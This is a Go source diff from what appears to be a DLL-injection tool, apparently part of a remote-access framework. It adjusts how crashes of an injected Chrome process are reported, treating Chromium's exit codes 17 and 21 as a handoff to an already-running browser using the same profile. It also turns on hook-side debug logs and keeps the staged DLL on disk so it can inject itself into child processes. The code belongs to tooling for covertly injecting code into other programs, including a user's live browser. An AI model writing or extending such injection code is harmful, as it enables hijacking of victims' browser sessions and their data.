@@ -123,6 +123,10 @@ func describeExitCode(code uint32) string {
 		return "process killed by Ctrl+C"
 	case 1:
 		return "general error (exit code 1)"
+	case 21:
+		return "exit code 0x15 (21) — another instance is already running with this user data / profile"
+	case 17:
+		return "exit code 0x11 (17) — handed off to an already-running instance"
 	default:
 		return fmt.Sprintf("exit code 0x%X (%d)", code, code)
 	}
@@ -149,9 +153,19 @@ func monitorProcessCrash(pid uint32, label string, notify func(step string, succ
 
 	if exitCode == 0 {
 		notify("exited", false, fmt.Sprintf("%s (PID %d) exited immediately — %s", label, pid, describeExitCode(exitCode)))
-	} else {
-		notify("crashed", false, fmt.Sprintf("%s (PID %d) crashed — %s", label, pid, describeExitCode(exitCode)))
+		return
 	}
+
+	// Chromium resolves "already running" conflicts by exiting with a handoff
+	// code (17/21) instead of faulting. When the injected instance was preceded
+	// by live Chrome holding the same profile, this is expected single-instance
+	// behavior — report it as an informational handoff, not a crash.
+	if (exitCode == 17 || exitCode == 21) && strings.Contains(strings.ToLower(label), "chrome") {
+		notify("handoff", true, fmt.Sprintf("%s (PID %d) handed off to an existing instance — %s", label, pid, describeExitCode(exitCode)))
+		return
+	}
+
+	notify("crashed", false, fmt.Sprintf("%s (PID %d) crashed — %s", label, pid, describeExitCode(exitCode)))
 }
 
 // enableDebugPrivilege attempts to enable SeDebugPrivilege for the current process.
@@ -1347,6 +1361,11 @@ func buildEnvironmentBlock(searchPath, replacePath, shmName string, dllSize int)
 		"RDI_SEARCH_PATH=" + searchPath,
 		"RDI_REPLACE_PATH=" + replacePath,
 	}
+	// Enable hook-side file logging; the oblivious DLL writes per-process trace
+	// logs to %TEMP%\Overlord\backstage\BackstageInjection-debug-<pid>.log.
+	if os.Getenv("BACKSTAGE_DEBUG_LOG") != "0" {
+		extra = append(extra, "BackstageInjectionDebug=1")
+	}
 	if shmName != "" {
 		extra = append(extra, "RDI_DLL_SECTION="+shmName)
 		extra = append(extra, fmt.Sprintf("RDI_DLL_SIZE=%d", dllSize))
@@ -1459,10 +1478,9 @@ func injectIntoProcess(hProcess uintptr, dllBytes []byte, method InjectionMethod
 			_ = os.Remove(dllPath)
 			return err
 		}
-		// The DLL is fully resident in the target and self-injects into child
-		// processes from the shared section, so the staged file is no longer
-		// needed.
-		_ = os.Remove(dllPath)
+		// Keep the staged file on disk: the injected DLL loads itself into child
+		// processes from this same on-disk path, so deleting it would break child
+		// injection. The content-addressed name means repeated injections reuse it.
 		return nil
 	default:
 		return reflectiveInject(hProcess, dllBytes)
